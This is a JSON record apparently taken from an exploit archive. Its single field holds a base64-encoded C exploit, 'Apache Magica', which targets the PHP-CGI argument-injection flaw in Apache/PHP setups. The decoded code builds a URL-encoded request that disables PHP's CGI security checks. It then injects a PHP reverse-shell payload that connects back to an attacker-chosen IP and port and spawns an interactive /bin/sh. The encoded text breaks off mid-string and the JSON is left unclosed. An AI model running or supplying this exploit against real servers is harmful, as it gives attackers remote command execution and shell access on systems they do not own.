{
    "source": "exploit-database", 
    "exploit": "LyogQXBhY2hlIE1hZ2ljYSBieSBLaW5nY29wZSAqLw0KLyogZ2NjIGFwYWNoZS1tYWdpa2EuYyAtbyBhcGFjaGUtbWFnaWthIC1sc3NsICovDQovKiBUaGlzIGlzIGEgY29kZSBleGVjdXRpb24gYnVnIGluIHRoZSBjb21iaW5hdGlvbiBvZiBBcGFjaGUgYW5kIFBIUC4NCk9uIERlYmlhbiBhbmQgVWJ1bnR1IHRoZSB2dWxuZXJhYmlsaXR5IGlzIHByZXNlbnQgaW4gdGhlIGRlZmF1bHQgaW5zdGFsbA0Kb2YgdGhlIHBocDUtY2dpIHBhY2thZ2UuIFdoZW4gdGhlIHBocDUtY2dpIHBhY2thZ2UgaXMgaW5zdGFsbGVkIG9uIERlYmlhbiBhbmQNClVidW50dSBvciBwaHAtY2dpIGlzIGluc3RhbGxlZCBtYW51YWxseSB0aGUgcGhwLWNnaSBiaW5hcnkgaXMgYWNjZXNzaWJsZSB1bmRlcg0KL2NnaS1iaW4vcGhwNSBhbmQgL2NnaS1iaW4vcGhwLiBUaGUgdnVsbmVyYWJpbGl0eSBtYWtlcyBpdCBwb3NzaWJsZSB0byBleGVjdXRlDQp0aGUgYmluYXJ5IGJlY2F1c2UgdGhpcyBiaW5hcnkgaGFzIGEgc2VjdXJpdHkgY2hlY2sgZW5hYmxlZCB3aGVuIGluc3RhbGxlZCB3aXRoDQpBcGFjaGUgaHR0cCBzZXJ2ZXIgYW5kIHRoaXMgc2VjdXJpdHkgY2hlY2sgaXMgY2lyY3VtdmVudGVkIGJ5IHRoZSBleHBsb2l0Lg0KV2hlbiBhY2Nlc3NpbmcgdGhlIHBocC1jZ2kgYmluYXJ5IHRoZSBzZWN1cml0eSBjaGVjayB3aWxsIGJsb2NrIHRoZSByZXF1ZXN0IGFuZA0Kd2lsbCBub3QgZXhlY3V0ZSB0aGUgYmluYXJ5Lg0KSW4gdGhlIHNvdXJjZSBjb2RlIGZpbGUgc2FwaS9jZ2kvY2dpX21haW4uYyBvZiBQSFAgd2UgY2FuIHNlZSB0aGF0IHRoZSBzZWN1cml0eQ0KY2hlY2sgaXMgZG9uZSB3aGVuIHRoZSBwaHAuaW5pIGNvbmZpZ3VyYXRpb24gc2V0dGluZyBjZ2kuZm9yY2VfcmVkaXJlY3QgaXMgc2V0DQphbmQgdGhlIHBocC5pbmkgY29uZmlndXJhdGlvbiBzZXR0aW5nIGNnaS5yZWRpcmVjdF9zdGF0dXNfZW52IGlzIHNldCB0byBuby4NClRoaXMgbWFrZXMgaXQgcG9zc2libGUgdG8gZXhlY3V0ZSB0aGUgYmluYXJ5IGJ5cGFzc2luZyB0aGUgU2VjdXJpdHkgY2hlY2sgYnkNCnNldHRpbmcgdGhlc2UgdHdvIHBocC5pbmkgc2V0dGluZ3MuDQpQcmlvciB0byB0aGlzIGNvZGUgZm9yIHRoZSBTZWN1cml0eSBjaGVjayBnZXRvcHQgaXMgY2FsbGVkIGFuZCBpdCBpcyBwb3NzaWJsZQ0KdG8gc2V0IGNnaS5mb3JjZV9yZWRpcmVjdCB0byB6ZXJvIGFuZCBjZ2kucmVkaXJlY3Rfc3RhdHVzX2VudiB0byB6ZXJvIHVzaW5nIHRoZQ0KLWQgc3dpdGNoLiBJZiBib3RoIHZhbHVlcyBhcmUgc2V0IHRvIHplcm8gYW5kIHRoZSByZXF1ZXN0IGlzIHNlbnQgdG8gdGhlIHNlcnZlcg0KcGhwLWNnaSBnZXRzIGZ1bGx5IGV4ZWN1dGVkIGFuZCB3ZSBjYW4gdXNlIHRoZSBwYXlsb2FkIGluIHRoZSBQT1NUIGRhdGEgZmllbGQNCnRvIGV4ZWN1dGUgYXJiaXRyYXJ5IHBocCBhbmQgdGhlcmVmb3JlIHdlIGNhbiBleGVjdXRlIHByb2dyYW1zIG9uIHRoZSBzeXN0ZW0uDQphcGFjaGUtbWFnaWthLmMgaXMgYW4gZXhwbG9pdCB0aGF0IGRvZXMgZXhhY3RseSB0aGUgcHJpb3IgZGVzY3JpYmVkLiBJdCBkb2VzDQpzdXBwb3J0IFNTTC4NCi8qIEFmZmVjdGVkIGFuZCB0ZXN0ZWQgdmVyc2lvbnMNClBIUCA1LjMuMTANClBIUCA1LjMuOC0xDQpQSFAgNS4zLjYtMTMNClBIUCA1LjMuMw0KUEhQIDUuMi4xNw0KUEhQIDUuMi4xMQ0KUEhQIDUuMi42LTMNClBIUCA1LjIuNitsZW5ueTE2IHdpdGggU3Vob3Npbi1QYXRjaA0KQWZmZWN0ZWQgdmVyc2lvbnMNClBIUCBwcmlvciB0byA1LjMuMTINClBIUCBwcmlvciB0byA1LjQuMg0KVW5hZmZlY3RlZCB2ZXJzaW9ucw0KUEhQIDQgLSBnZXRvcHQgcGFyc2VyIHVuZXhwbG9pdGFibGUNClBIUCA1LjMuMTIgYW5kIHVwDQpQSFAgNS40LjIgYW5kIHVwDQpVbmFmZmVjdGVkIHZlcnNpb25zIGFyZSBwYXRjaGVkIGJ5IENWRS0yMDEyLTE4MjMuDQoqLw0KLyogICAgLg0KICAgICAvJ1xycnEgcmsNCiAuICAvLyBcXCAgLg0KLnguLy9mY29cXC18LQ0KICcvL2NtdGNvXFx6dA0KIC8vNm1lcXJnLlxcdHENCi8vX19fX19fX19fXFwnDQpFSlBHUU8NCmFwYWNoZS1tYWdpY2EuYyBieSBLaW5nY29wZQ0KKi8NCg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8Z2V0b3B0Lmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3RkZGVmLmg+DQojaW5jbHVkZSA8b3BlbnNzbC9yYW5kLmg+DQojaW5jbHVkZSA8b3BlbnNzbC9zc2wuaD4NCiNpbmNsdWRlIDxvcGVuc3NsL2Vyci5oPg0KI2luY2x1ZGUgPG5ldGRiLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCg0KdHlwZWRlZiBzdHJ1Y3Qgew0KCWludCBzb2NrZmQ7DQoJU1NMICpoYW5kbGU7DQoJU1NMX0NUWCAqY3R4Ow0KfSBjb25uZWN0aW9uOw0KDQp2b2lkIHVzYWdlKGNoYXIgKmFyZ3ZbXSkNCnsNCiAgcHJpbnRmKCJ1c2FnZTogJXMgPC0tdGFyZ2V0IHRhcmdldD4gPC0tcG9ydCBwb3J0PiA8LS1wcm90b2NvbCBodHRwfGh0dHBzPiAiIFwNCiAgIjwtLXJldmVyc2UtaXAgaXA+IDwtLXJldmVyc2UtcG9ydCBwb3J0PiBbLS1mb3JjZS1pbnRlcnByZXRlciBpbnRlcnByZXRlcl1cbiIsDQogICBhcmd2WzBdKTsNCiAgZXhpdCgxKTsNCn0NCg0KY2hhciBwb3N0c3RyW10gPSAiUE9TVCAlcz8lJTJEJSU2NCslJTYxJSU2QyUlNkMlJTZGJSU3NyUlNUYiIFwNCiAiJSU3NSUlNzIlJTZDJSU1RiUlNjklJTZFJSU2MyUlNkMlJTc1JSU2NCUlNjUlJTNEJSU2RiUlNkUrJSUyRCUlNjQiIFwNCiAiKyUlNzMlJTYxJSU2NiUlNjUlJTVGJSU2RCUlNkYlJTY0JSU2NSUlM0QlJTZGJSU2NiUlNjYrJSUyRCUlNjQrJSU3MyIgXA0KICIlJTc1JSU2OCUlNkYlJTczJSU2OSUlNkUlJTJFJSU3MyUlNjklJTZEJSU3NSUlNkMlJTYxJSU3NCUlNjklJTZGJSU2RSIgXA0KICIlJTNEJSU2RiUlNkUrJSUyRCUlNjQrJSU2NCUlNjklJTczJSU2MSUlNjIlJTZDJSU2NSUlNUYlJTY2JSU3NSUlNkUlJTYzIiBcDQogIiUlNzQlJTY5JSU2RiUlNkUlJTczJSUzRCUlMjIlJTIyKyUlMkQlJTY0KyUlNkYlJTcwJSU2NSUlNkUlJTVGJSU2MiIgXA0KICIlJTYxJSU3MyUlNjUlJTY0JSU2OSUlNzIlJTNEJSU2RSUlNkYlJTZFJSU2NSslJTJEJSU2NCslJTYxJSU3NSUlNzQiIFwNCiAiJSU2RiUlNUYlJTcwJSU3MiUlNjUlJTcwJSU2NSUlNkUlJTY0JSU1RiUlNjYlJTY5JSU2QyUlNjUlJTNEJSU3MCUlNjgiIFwNCiAiJSU3MCUlM0ElJTJGJSUyRiUlNjklJTZFJSU3MCUlNzUlJTc0KyUlMkQlJTY0KyUlNjMlJTY3JSU2OSUlMkUlJTY2JSU2RiIgXA0KICIlJTcyJSU2MyUlNjUlJTVGJSU3MiUlNjUlJTY0JSU2OSUlNzIlJTY1JSU2MyUlNzQlJTNEJSUzMCslJTJEJSU2NCslJTYzIiBcDQogIiUlNjclJTY5JSUyRSUlNzIlJTY1JSU2NCUlNjklJTcyJSU2NSUlNjMlJTc0JSU1RiUlNzMlJTc0JSU2MSUlNzQlJTc1JSU3MyIgXA0KICIlJTVGJSU2NSUlNkUlJTc2JSUzRCUlMzArJSUyRCUlNkUgSFRUUC8xLjFcclxuIiBcDQogIkhvc3Q6ICVzXHJcbiIgXA0KICJVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoaVBhZDsgQ1BVIE9TIDZfMCBsaWtlIE1hYyBPUyBYKSBBcHBsZVdlYktpdC81MzYuMjYiIFwNCiAiKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzYuMCBNb2JpbGUvMTBBNTM1NWQgU2FmYXJpLzg1MzYuMjVcclxuIiBcDQogIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkXHJcbiIgXA0KICJDb250ZW50LUxlbmd0aDogJWRcclxuIiBcDQogIkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4lcyI7DQpjaGFyIHBocHN0cltdID0gIjw/cGhwXG4iIFwNCiJzZXRfdGltZV9saW1pdCgwKTtcbiIgXA0KIiRpcCA9ICclcyc7XG4iIFwNCiIkcG9ydCA9ICVkO1xuIiBcDQoiJGNodW5rX3NpemUgPSAxNDAwO1xuIiBcDQoiJHdyaXRlX2EgPSBudWxsO1xuIiBcDQoiJGVycm9yX2EgPSBudWxsO1xuIiBcDQoiJHNoZWxsID0gJ3Vuc2V0IEhJU1RGSUxFOyB1bnNldCBISVNUU0laRTsgdW5hbWUgLWE7IHc7IGlkOyAvYmluL3NoIC1pJztcbiIgXA0KIiRkYWVtb24gPSAwO1xuIiBcDQoiJGRlYnVnID0gMDtcbiIgXA0KImlmIChmdW5jdGlvbl9leGlzdHMoJ3BjbnRsX2ZvcmsnKSkge1xuIiBcDQoiCSRwaWQgPSBwY250bF9mb3JrKCk7CVxuIiBcDQoiCWlmICgkcGlkID09IC0xKSB7XG4iIFwNCiIJCXByaW50aXQoXCJFUlJPUjogQ2FuJ3QgZm9ya1wiKTtcbiIgXA0KIgkJZXhpdCgxKTtcbiIgXA0KIgl9XG4iIFwNCiIJaWYgKCRwaWQpIHtcbiIgXA0KIgkJZXhpdCgwKTtcbiIgXA0KIgl9XG4iIFwNCiIJaWYgKHBvc2l4X3NldHNpZCgpID09IC0xKSB7XG4iIFwNCiIJCXByaW50aXQoXCJFcnJvcjogQ2FuJ3Qgc2V0c2lkKClcIik7XG4iIFwNCiIJCWV4aXQoMSk7XG4iIFwNCiIJfVxuIiBcDQoiCSRkYWVtb24gPSAxO1xuIiBcDQoifSBlbHNlIHtcbiIgXA0KIglwcmludGl0KFwiV0FSTklORzogRmFpbGVkIHRvIGRhZW1vbmlzZS5cIik7XG4iIFwNCiJ9XG4iIFwNCiJjaGRpcihcIi9cIik7XG4iIFwNCiJ1bWFzaygwKTtcbiIgXA0KIiRzb2NrID0gZnNvY2tvcGVuKCRpcCwgJHBvcnQsICRlcnJubywgJGVycnN0ciwgMzApO1xuIiBcDQoiaWYgKCEkc29jaykge1xuIiBcDQoiCXByaW50aXQoXCIkZXJyc3RyICgkZXJybm8pXCIpO1xuIiBcDQoiCWV4aXQoMSk7XG4iIFwNCiJ9XG4iIFwNCiIkZGVzY3JpcHRvcnNwZWMgPSBhcnJheShcbiIgXA0KIiAgIDAgPT4gYXJyYXkoXCJwaXBlXCIsIFwiclwiKSxcbiIgXA0KIiAgIDEgPT4gYXJyYXkoXCJwaXBlXCIsIFwid1wiKSxcbiIgXA0KIiAgIDIgPT4gYXJyYXkoXCJwaXBlXCIsIFwid1wiKVxuIiBcDQoiKTtcbiIgXA0KIiRwcm9jZXNzID0gcHJvY19vcGVuKCRzaGVsbCwgJGRlc2NyaXB0b3JzcGVjLCAkcGlwZXMpO1xuIiBcDQoiaWYgKCFpc19yZXNvdXJjZSgkcHJvY2VzcykpIHtcbiIgXA0KIglwcmludGl0KFwiRVJST1I6IENhbid0IHNwYXduIHNoZWxsXCIpO1xuIiBcDQoiCWV4aXQoMSk7XG4iIFwNCiJ9XG4iIFwNCiJzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1swXSwgMCk7XG4iIFwNCiJzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1sxXSwgMCk7XG4iIFwNCiJzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1syXSwgMCk7XG4iIFwNCiJzdHJlYW1fc2V0X2Jsb2NraW5nKCRzb2NrLCAwKTtcbiIgXA0KIndoaWxlICgxKSB7XG4iIFwNCiIJaWYgKGZlb2YoJHNvY2spKSB7XG4iIFwNCiIJCXByaW50aXQoXCJFUlJPUjogU2hlbGwgY29ubmVjdGlvbiB0ZXJtaW5hdGVkXCIpO1xuIiBcDQoiCQlicmVhaztcbiIgXA0KIgl9XG4iIFwNCiIJaWYgKGZlb2YoJHBpcGVzWzFdKSkge1xuIiBcDQoiCQlwcmludGl0KFwiRVJST1I6IFNoZWxsIHByb2Nlc3MgdGVybWluYXRlZFwiKTtcbiIgXA0KIgkJYnJlYWs7XG4iIFwNCiIJfVxuIiBcDQoiCSRyZWFkX2EgPSBhcnJheSgkc29jaywgJHBpcGVzWzFdLCAkcGlwZXNbMl0pO1xuIiBcDQoiCSRudW1fY2hhbmdlZF9zb2NrZXRzID0gc3RyZWFtX3NlbGVjdCgkcmVhZF9hLCAkd3JpdGVfYSwgJGVycm9yX2EsIG51bGwpO1xuIiBcDQoiCWlmIChpbl9hcnJheSgkc29jaywgJHJlYWRfYSkpIHtcbiIgXA0KIgkJaWYgKCRkZWJ1ZykgcHJpbnRpdChcIlNPQ0sgUkVBRFwiKTtcbiIgXA0KIgkJJGlucHV0ID0gZnJlYWQoJHNvY2ssICRjaHVua19zaXplKTtcbiIgXA0KIgkJaWYgKCRkZWJ1ZykgcHJpbnRpdChcIlNPQ0s6ICRpbnB1dFwiKTtcbiIgXA0KIgkJZndyaXRlKCRwaXBlc1swXSwgJGlucHV0KTtcbiIgXA0KIgl9XG4iIFwNCiIJaWYgKGluX2FycmF5KCRwaXBlc1sxXSwgJHJlYWRfYSkpIHtcbiIgXA0KIgkJaWYgKCRkZWJ1ZykgcHJpbnRpdChcIlNURE9VVCBSRUFEXCIpO1xuIiBcDQoiCQkkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMV0sICRjaHVua19zaXplKTtcbiIgXA0KIgkJaWYgKCRkZWJ1ZykgcHJpbnRpdChcIlNURE9VVDogJGlucHV0XCIpO1xuIiBcDQoiCQlmd3JpdGUoJHNvY2ssICRpbnB1dCk7XG4iIFwNCiIJfVxuIiBcDQoiCWlmIChpbl9hcnJheSgkcGlwZXNbMl0sICRyZWFkX2EpKSB7XG4iIFwNCiIJCWlmICgkZGVidWcpIHByaW50aXQoXCJTVERFUlIgUkVBRFwiKTtcbiIgXA0KIgkJJGlucHV0ID0gZnJlYWQoJHBpcGVzWzJdLCAkY2h1bmtfc2l6ZSk7XG4iIFwNCiIJCWlmICgkZGVidWcpIHByaW50aXQoXCJTVERFUlI6ICRpbnB1dFwiKTtcbiIgXA0KIgkJZndyaXRlKCRzb2NrLCAkaW5wdXQpO1xuIiBcDQoiCX1cbiIgXA0KIn1cbiIgXA0KIlxuIiBcDQoiZmNsb3NlKCRzb2NrKTtcbiIgXA0KImZjbG9zZSgkcGlwZXNbMF0pO1xuIiBcDQoiZmNsb3NlKCRwaXBlc1sxXSk7XG4iIFwNCiJmY2xvc2UoJHBpcGVzWzJdKTtcbiIgXA0KInByb2NfY2xvc2UoJHByb2Nlc3MpO1xuIiBcDQoiZnVuY3Rpb24gcHJpbnRpdCAoJHN0cmluZykge1xuIiBcDQoiCWlmICghJGRhZW1vbikge1xuIiBcDQoiCQlwcmludCBcIiRzdHJpbmdcblwiO1xuIiBcDQoiCX1cbiIgXA0KIn1cbiIgXA0KImV4aXQoMSk7XG4iIFwNCiI/PiI7DQoNCnN0cnVjdCBzb2NrYWRkcl9pbiAqZ2V0aG9zdGJ5bmFtZV8oY2hhciAqaG9zdG5hbWUsIHVuc2lnbmVkIHNob3J0IHBvcnQpDQp7DQogc3RydWN0IGhvc3RlbnQgKmhlOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzZXJ2ZXIsICpzZXJ2ZXJjb3B5Ow0KIA0KIGlmICgoaGU9Z2V0aG9zdGJ5bmFtZShob3N0bmFtZSkpID09IE5VTEwpIHsNCiAgcHJpbnRmKCJIb3N0bmFtZSBjYW5ub3QgYmUgcmVzb2x2ZWRcbiIpOw0KICBleGl0KDI1NSk7DQogfQ0KIA0KIHNlcnZlcmNvcHkgPSBtYWxsb2Moc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcl9pbikpOw0KIGlmICghc2VydmVyY29weSkgew0KCXByaW50ZigibWFsbG9jIGVycm9yICgxKVxuIik7DQoJZXhpdCgyNTUpOw0KIH0NCiBtZW1zZXQoJnNlcnZlciwgJ1wwJywgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcl9pbikpOw0KIG1lbWNweSgmc2VydmVyLnNpbl9hZGRyLCBoZS0+aF9hZGRyX2xpc3RbMF0sICBoZS0+aF9sZW5ndGgpOw0KIHNlcnZlci5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiBzZXJ2ZXIuc2luX3BvcnQgPSBodG9ucyhwb3J0KTsNCiBtZW1jcHkoc2VydmVyY29weSwgJnNlcnZlciwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcl9pbikpOw0KIHJldHVybiBzZXJ2ZXJjb3B5Ow0KfQ0KDQpjaGFyICpzc2xyZWFkKGNvbm5lY3Rpb24gKmMpDQp7DQogIGNoYXIgKnJjID0gTlVMTDsNCiAgaW50IHJlY2VpdmVkLCBjb3VudCA9IDAsIGNvdW50Mj0wOw0KICBjaGFyIGNoOw0KDQogIGZvcig7OykNCiAgew0KICAgaWYgKCFyYykNCiAgICByYyA9IGNhbGxvYygxMDI0LCBzaXplb2YgKGNoYXIpICsgMSk7DQogICBlbHNlDQogICAgaWYgKGNvdW50MiAlIDEwMjQgPT0gMCkgew0KICAgICByYyA9IHJlYWxsb2MocmMsIChjb3VudDIgKyAxKSAqIDEwMjQgKiBzaXplb2YgKGNoYXIpICsgMSk7DQogICAgfQ0KICAgIHJlY2VpdmVkID0gU1NMX3JlYWQoYy0+aGFuZGxlLCAmY2gsIDEpOw0KICAgIGlmIChyZWNlaXZlZCA9PSAxKSB7DQogICAgIHJjW2NvdW50KytdID0gY2g7DQogICAgIGNvdW50MisrOw0KICAgICBpZiAoY291bnQyID4gMTAyNCo1KQ0KCSAgYnJlYWs7DQogICAgfQ0KICAgIGVsc2UNCiAgICAgYnJlYWs7DQogICB9DQogIHJldHVybiByYzsNCn0NCg0KY2hhciAqcmVhZF8oaW50IHNvY2tmZCkNCnsNCiAgY2hhciAqcmMgPSBOVUxMOw0KICBpbnQgcmVjZWl2ZWQsIGNvdW50ID0gMCwgY291bnQyPTA7DQogIGNoYXIgY2g7DQoNCiAgZm9yKDs7KQ0KICB7DQogICBpZiAoIXJjKQ0KICAgIHJjID0gY2FsbG9jKDEwMjQsIHNpemVvZiAoY2hhcikgKyAxKTsNCiAgIGVsc2UNCiAgICBpZiAoY291bnQyICUgMTAyNCA9PSAwKSB7DQogICAgIHJjID0gcmVhbGxvYyhyYywgKGNvdW50MiArIDEpICogMTAyNCAqIHNpemVvZiAoY2hhcikgKyAxKTsNCiAgICB9DQogICAgcmVjZWl2ZWQgPSByZWFkKHNvY2tmZCwgJmNoLCAxKTsNCiAgICBpZiAocmVjZWl2ZWQgPT0gMSkgew0KICAgICByY1tjb3VudCsrXSA9IGNoOw0KICAgICBjb3VudDIrKzsNCiAgICAgaWYgKGNvdW50MiA+IDEwMjQqNSkNCgkgIGJyZWFrOw0KICAgIH0NCiAgICBlbHNlDQogICAgIGJyZWFrOw0KICAgfQ0KICByZXR1cm4gcmM7DQp9DQoNCnZvaWQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKQ0Kew0KICBjaGFyICp0YXJnZXQsICpwcm90b2NvbCwgKnRhcmdldGlwLCAqd3JpdGVzdHIsICp0bXBzdHIsICpyZWFkYnVmPU5VTEwsDQogICAqaW50ZXJwcmV0ZXIsICpyZXZlcnNlaXAsICpyZXZlcnNlcG9ydHN0ciwgKmZvcmNlaW50ZXJwcmV0ZXI9TlVMTDsNCiAgY2hhciBodHRwc2ZsYWc9MDsNCiAgdW5zaWduZWQgc2hvcnQgcG9ydD0wLCByZXZlcnNlcG9ydD0wOw0KICBzdHJ1Y3Qgc29ja2FkZHJfaW4gKnNlcnZlcjsNCiAgaW50IHNvY2tmZDsNCiAgdW5zaWduZWQgaW50IHdyaXRlc2l6ZSwgdG1wc2l6ZTsNCiAgdW5zaWduZWQgaW50IGk7DQogIGNvbm5lY3Rpb24gKnNzbGNvbm5lY3Rpb247DQogIHByaW50ZigiLT09IEFwYWNoZSBNYWdpa2EgYnkgS2luZ2NvcGUgPT0tXG4iKTsNCiAgZm9yKDs7KQ0KICB7DQoJIGludCBjOw0KICAgICBpbnQgb3B0aW9uX2luZGV4PTA7DQogICAgIHN0YXRpYyBzdHJ1Y3Qgb3B0aW9uIGxvbmdfb3B0aW9uc1tdID0gew0KCSAgIHsidGFyZ2V0IiwgcmVxdWlyZWRfYXJndW1lbnQsIDAsIDAgfSwNCgkgICB7InBvcnQiLCByZXF1aXJlZF9hcmd1bWVudCwgMCwgMCB9LA0KCSAgIHsicHJvdG9jb2wiLCByZXF1aXJlZF9hcmd1bWVudCwgMCwgMCB9LA0KCSAgIHsicmV2ZXJzZS1pcCIsIHJlcXVpcmVkX2FyZ3VtZW50LCAwLCAwIH0sDQoJICAgeyJyZXZlcnNlLXBvcnQiLCByZXF1aXJlZF9hcmd1bWVudCwgMCwgMCB9LA0KCSAgIHsiZm9yY2UtaW50ZXJwcmV0ZXIiLCByZXF1aXJlZF9hcmd1bWVudCwgMCwgMCB9LAkgICANCgkgICB7MCwgMCwgMCwgMCB9DQoJICB9Ow0KCSANCgkgYyA9IGdldG9wdF9sb25nKGFyZ2MsIGFyZ3YsICIiLCBsb25nX29wdGlvbnMsICZvcHRpb25faW5kZXgpOw0KICAgICBpZiAoYyA8IDApDQogICAgIAlicmVhazsNCiAgICAgDQogICAgIHN3aXRjaCAoYykgew0KCSBjYXNlIDA6DQoJICBzd2l0Y2ggKG9wdGlvbl9pbmRleCkgew0KCSAgIGNhc2UgMDoNCgkgICAgaWYgKG9wdGFyZykgew0KCSAgICAgdGFyZ2V0ID0gY2FsbG9jKHN0cmxlbihvcHRhcmcpKzEsIHNpemVvZihjaGFyKSk7DQoJICAgICBpZiAoIXRhcmdldCkgew0KCQkgIHByaW50ZigiY2FsbG9jIGVycm9yICgyKVxuIik7DQoJICAgICAgZXhpdCgyNTUpOw0KICAgICAgICAgfQ0KCSAgICAgbWVtY3B5KHRhcmdldCwgb3B0YXJnLCBzdHJsZW4ob3B0YXJnKSsxKTsNCiAgICAJfQ0KICAgICAgICBicmVhazsNCiAgICAgICBjYXNlIDE6DQogICAgICAgIGlmKG9wdGFyZykNCgkgICAgIHBvcnQgPSBhdG9pKG9wdGFyZyk7DQogICAgICAgIGJyZWFrOw0KICAgICAgIGNhc2UgMjoNCiAgICAgICAgcHJvdG9jb2wgPSBjYWxsb2Moc3RybGVuKG9wdGFyZykrMSwgc2l6ZW9mKGNoYXIpKTsNCiAgICAgICAgaWYgKCFwcm90b2NvbCkgew0KCSAgICAgcHJpbnRmKCJjYWxsb2MgZXJyb3IgKDMpXG4iKTsNCiAgICAgICAgIGV4aXQoMjU1KTsNCiAgICAgICAgfQ0KICAgICAgICBtZW1jcHkocHJvdG9jb2wsIG9wdGFyZywgc3RybGVuKG9wdGFyZykrMSk7DQogICAgICAgIGlmICghc3RyY21wKHByb3RvY29sLCAiaHR0cHMiKSkNCiAgICAgICAgIGh0dHBzZmxhZz0xOw0KICAgICAgICBicmVhazsNCiAgICAgICBjYXNlIDM6DQogICAgICAgIHJldmVyc2VpcCA9IGNhbGxvYyhzdHJsZW4ob3B0YXJnKSsxLCBzaXplb2YoY2hhcikpOw0KICAgICAgICBpZiAoIXJldmVyc2VpcCkgew0KCSAgICAgcHJpbnRmKCJjYWxsb2MgZXJyb3IgKDQpXG4iKTsNCiAgICAgICAgIGV4aXQoMjU1KTsNCiAgICAgICAgfQ0KICAgICAgICBtZW1jcHkocmV2ZXJzZWlwLCBvcHRhcmcsIHN0cmxlbihvcHRhcmcpKzEpOyAgICAgICANCiAgICAgICAgYnJlYWs7DQogICAgICAgY2FzZSA0Og0KCSAgICByZXZlcnNlcG9ydCA9IGF0b2kob3B0YXJnKTsgICAgICAgDQoJCXJldmVyc2Vwb3J0c3RyID0gY2FsbG9jKHN0cmxlbihvcHRhcmcpKzEsIHNpemVvZihjaGFyKSk7DQogICAgICAgIGlmICghcmV2ZXJzZXBvcnRzdHIpIHsNCgkgICAgIHByaW50ZigiY2FsbG9jIGVycm9yICg1KVxuIik7DQogICAgICAgICBleGl0KDI1NSk7DQogICAgICAgIH0NCiAgICAgICAgbWVtY3B5KHJldmVyc2Vwb3J0c3RyLCBvcHRhcmcsIHN0cmxlbihvcHRhcmcpKzEpOyAgCSAgICAgDQogICAgICAgIGJyZWFrOw0KICAgICAgIGNhc2UgNToNCiAgICAgICAgZm9yY2VpbnRlcnByZXRlciA9IGNhbGxvYyhzdHJsZW4ob3B0YXJnKSsxLCBzaXplb2YoY2hhcikpOw0KICAgICAgICBpZiAoIWZvcmNlaW50ZXJwcmV0ZXIpIHsNCgkgICAgIHByaW50ZigiY2FsbG9jIGVycm9yICg2KVxuIik7DQogICAgICAgICBleGl0KDI1NSk7DQogICAgICAgIH0NCiAgICAgICAgbWVtY3B5KGZvcmNlaW50ZXJwcmV0ZXIsIG9wdGFyZywgc3RybGVuKG9wdGFyZykrMSk7ICAgICAgIA0KICAgICAgICBicmVhazsNCiAgICAgICBkZWZhdWx0Og0KICAgICAgICB1c2FnZShhcmd2KTsNCgkgIH0NCgkgIGJyZWFrOw0KCSANCgkgZGVmYXVsdDoNCgkgIHVzYWdlKGFyZ3YpOw0KICAgICB9DQogIH0NCg0KICBpZiAoKG9wdGluZCA8IGFyZ2MpIHx8ICF0YXJnZXQgfHwgIXByb3RvY29sIHx8ICFwb3J0IHx8DQogICAgICAhcmV2ZXJzZWlwIHx8ICFyZXZlcnNlcG9ydCl7DQoJdXNhZ2UoYXJndik7DQogIH0NCiAgDQogIHNlcnZlciA9IGdldGhvc3RieW5hbWVfKHRhcmdldCwgcG9ydCk7DQogIGlmICghc2VydmVyKSB7DQogICBwcmludGYoIkVycm9yIHdoaWxlIHJlc29sdmluZyBob3N0bmFtZS4gKDcpXG4iKTsNCiAgIGV4aXQoMjU1KTsNCiAgfQ0KDQogIGNoYXIgKmludGVycHJldGVyc1s1XTsNCiAgaW50IG5pbnRlcnByZXRlcnMgPSA1Ow0KICBpbnRlcnByZXRlcnNbMF0gPSBzdHJkdXAoIi9jZ2ktYmluL3BocCIpOw0KICBpbnRlcnByZXRlcnNbMV0gPSBzdHJkdXAoIi9jZ2ktYmluL3BocDUiKTsNCiAgaW50ZXJwcmV0ZXJzWzJdID0gc3RyZHVwKCIvY2dpLWJpbi9waHAtY2dpIik7DQogIGludGVycHJldGVyc1szXSA9IHN0cmR1cCgiL2NnaS1iaW4vcGhwLmNnaSIpOw0KICBpbnRlcnByZXRlcnNbNF0gPSBzdHJkdXAoIi9jZ2ktYmluL3BocDQiKTsNCiAgDQogIGZvciAoaT0wO2k8bmludGVycHJldGVycztpKyspIHsNCiAgIGludGVycHJldGVyID0gaW50ZXJwcmV0ZXJzW2ldOw0KICAgaWYgKGZvcmNlaW50ZXJwcmV0ZXIpIHsNCiAgICAgaW50ZXJwcmV0ZXIgPSBzdHJkdXAoZm9yY2VpbnRlcnByZXRlcik7DQogICB9DQogICBpZiAoZm9yY2VpbnRlcnByZXRlciAmJiBpKQ0KICAgIGJyZWFrOw0KICAgcHJpbnRmKCIlc1xuIiwgaW50ZXJwcmV0ZXIpOw0KICAgDQogICBzb2NrZmQgPSBzb2NrZXQoQUZfSU5FVCwgU09DS19TVFJFQU0sIDApOw0KICAgaWYgKHNvY2tmZCA8IDEpIHsgDQoJIHByaW50Zigic29ja2V0IGVycm9yICg4KVxuIik7DQoJIGV4aXQoMjU1KTsNCiAgIH0NCiAgDQogICBpZiAoY29ubmVjdChzb2NrZmQsICh2b2lkKilzZXJ2ZXIsIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHJfaW4pKSA8IDApIHsNCiAgICBwcmludGYoImNvbm5lY3QgZXJyb3IgKDkpXG4iKTsNCiAgICBleGl0KDI1NSk7CSAgDQogICB9DQogICBp